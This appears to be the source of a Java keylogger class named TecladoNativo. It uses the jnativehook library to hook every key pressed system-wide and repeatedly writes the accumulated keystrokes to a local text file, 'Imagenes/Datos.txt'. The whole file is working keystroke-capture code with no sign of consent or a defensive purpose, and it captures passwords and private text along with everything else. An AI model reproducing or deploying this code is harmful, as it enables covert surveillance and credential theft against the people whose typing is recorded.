package Modelo;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author Al   
 */
public class TecladoNativo extends Thread implements NativeKeyListener {
//
    private String datos;

    public void run() {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {

        String recibido=NativeKeyEvent.getKeyText(e.getKeyCode());
        
        if(recibido.length()>1){
            if(recibido.equals("Espacio")){
                recibido=" ";
            }
            else{
                recibido=" (--"+recibido+"--)\n";
            }
            
        }
        datos += recibido;

        archivo(datos);

        //Hola mi nombre es alveirofdsfdsfsdfsdrr
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        //   System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
    }

    public void archivo(String data) {

        try {
            
            //String ruta = "C://Users//USUARIO//Desktop//Imagenes//Datos.txt";
              String ruta = "Imagenes/Datos.txt";
            String contenido = data;
            File file = new File(ruta);
            // Si el archivo no existe es creado
            if (!file.exists()) {
                file.createNewFile();
            }
            FileWriter fw = new FileWriter(file);
            BufferedWriter bw = new BufferedWriter(fw);
            bw.write(contenido);
            bw.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

}
